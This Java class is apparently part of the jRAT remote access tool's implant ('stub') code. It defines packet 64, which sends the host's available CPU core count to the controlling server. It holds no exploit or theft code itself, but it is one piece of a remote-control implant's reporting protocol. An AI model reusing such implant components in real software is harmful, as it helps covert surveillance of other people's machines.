package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet64InitAvailableCores extends AbstractOutgoingPacket {

	private int cores;

	public Packet64InitAvailableCores(int cores) {
		this.cores = cores;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeShort(cores);
	}

	@Override
	public byte getPacketId() {
		return (byte) 64;
	}
}
